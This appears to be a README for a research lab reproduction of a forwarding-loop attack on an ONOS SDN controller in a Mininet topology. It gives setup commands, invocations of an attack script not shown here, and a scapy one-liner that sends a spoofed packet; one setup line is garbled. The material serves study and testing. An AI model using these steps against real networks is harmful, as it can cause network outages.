# Usage


1. Open a terminal (entering the p4 directory by default)

<div align="center">
  <img src="./figs/0.png" width="80%" alt="">
</div>

2. Enterh the `onos` directory
```bash
cd onos

bazel run onos-local
```

<div align="center">
  <img src="./figs/startonos2.png" width="80%" alt="">
</div>

3. Open a new terminal, enter the `onos` directory
```
cd onos

./tools/test/bin/onos localhost
```

<div align="center">
  <img src="./figs/startonos.png" width="80%" alt="">
</div>


4. Start the app
```bash
app activate org.onosproject.openflow
app activate org.onosproject.drivers
app activate org.onosproject.fwd
wipe-out please; app deactivate org.onosproject.fud; app activate org.onosproject. fwd
```

<div align="center">
  <img src="./figs/startapp.png" width="80%" alt="">
</div>

5. Open a new terminal
```bash
cd loopgenexp/ControllerFeasibility-onos/

sudo python3 -E LoopGen_topo.py

xterm h1 h2 h3
```

<div align="center">
  <img src="./figs/starttopo.png" width="80%" alt="">
</div>


6. Launch attack

In h1 xterm, run
```
python3 attack_l2_timed.py h1-eth0 00:00:00:00:00:02
```

In h2 xterm, run
```
python3 attack_l2_timed.py h2-eth0 00:00:00:00:00:03
```

In h3 xterm, run
```
python3 attack_l2_timed.py h3-eth0 00:00:00:00:00:01
```

<div align="center">
  <img src="./figs/attack.png" width="80%" alt="">
</div>


7. Then, in the mininet terminal

```
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"
```

<div align="center">
  <img src="./figs/attack2.png" width="80%" alt="">
</div>

8. Open a new terminal and start wireshark

```
sudo wireshark
```

You can see that the attack packet was looped.

<div align="center">
  <img src="./figs/res.png" width="80%" alt="">
</div>


